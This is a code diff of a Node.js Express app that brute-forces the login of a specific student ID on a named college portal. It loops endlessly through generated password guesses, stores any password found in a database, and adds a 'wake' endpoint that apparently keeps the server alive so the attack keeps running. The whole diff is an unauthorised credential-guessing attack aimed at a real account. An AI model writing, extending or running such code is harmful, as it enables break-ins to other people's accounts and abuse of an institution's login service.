@@ -10,6 +10,8 @@ dotenv.config({ path: "./.env" });
 const app = express();
 const port = 3000;
 
+app.use(express.json())
+
 let isInitiated;
 const username = 2412800;
 const fail_url = "https://agclms.in/Elogin/StudentLogin";
@@ -25,9 +27,22 @@ async function connectDB() {
   }
 }
 
+app.get("/wake", async (req, res) => {
+  console.log("fuction called");
+
+  setTimeout(() => {
+    fetch('https://amrit-hanjra.vercel.app/api/wake', {
+      method : "GET",
+      // headers : {
+      //   'Content-Type' : 'application/json'
+      // }
+    })
+  }, 100)
+})
+
 app.get("/", async (req, res) => {
   let str;
-  if (isInitiated) return res.send(`Initiated, ${str}`);
+  if (isInitiated) return res.send(`Initiated`);
   isInitiated = true;
 
   await connectDB();
@@ -87,33 +102,37 @@ function nextComb(str) {
 
 const main = async (str) => {
   try {
+    while (true) {
+      for (let i = 0; i < 10; i++) {
+        const response = await fetch("https://agclms.in/Elogin/StudentLogin", {
+          method: "POST",
+          headers: {
+            Accept:
+              "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8,pa;q=0.7",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Cache-Control": "max-age=0",
+          },
+          referrer: "https://agclms.in/Elogin/StudentLogin",
+          body: `StudentId=${username}&Password=${str}&__RequestVerificationToken=YOUR_TOKEN_HERE`,
+        });
 
-    for (let i = 0; i < 10000; i++) {
-      const response = await fetch("https://agclms.in/Elogin/StudentLogin", {
-        method: "POST",
-        headers: {
-          Accept:
-            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-          "Accept-Language": "en-US,en;q=0.9,hi;q=0.8,pa;q=0.7",
-          "Content-Type": "application/x-www-form-urlencoded",
-          "Cache-Control": "max-age=0",
-        },
-        referrer: "https://agclms.in/Elogin/StudentLogin",
-        body: `StudentId=${username}&Password=${str}&__RequestVerificationToken=YOUR_TOKEN_HERE`,
-      });
+        if (response.url === fail_url) {
+          console.log(`Attempted: ${str}`);
+        } else if (response.url === succ_url) {
+          await connectDB();
+          console.log(`Password found: ${str}`);
 
-      if (response.url === fail_url) {
-        console.log(`Attempted: ${str}`);
-      } else if (response.url === succ_url) {
-        await connectDB();
-        console.log(`Password found: ${str}`);
+          const password = new Password({ password: str });
+          await password.save();
 
-        const password = new Password({ password: str });
-        await password.save();
-        return;
-      } else {
-        console.error("Unexpected URL:", response.url);
-        return;
+          return;
+        } else {
+          console.error("Unexpected URL:", response.url);
+          return;
+        }
+
+        if(i != 9) str = nextComb(str);
       }
 
       try {
@@ -122,6 +141,8 @@ const main = async (str) => {
 
         oldTrack.passTrack = str;
         oldTrack.digiTrack = totalDigit;
+
+        console.log(oldTrack)
 
         await oldTrack.save();
       } catch {
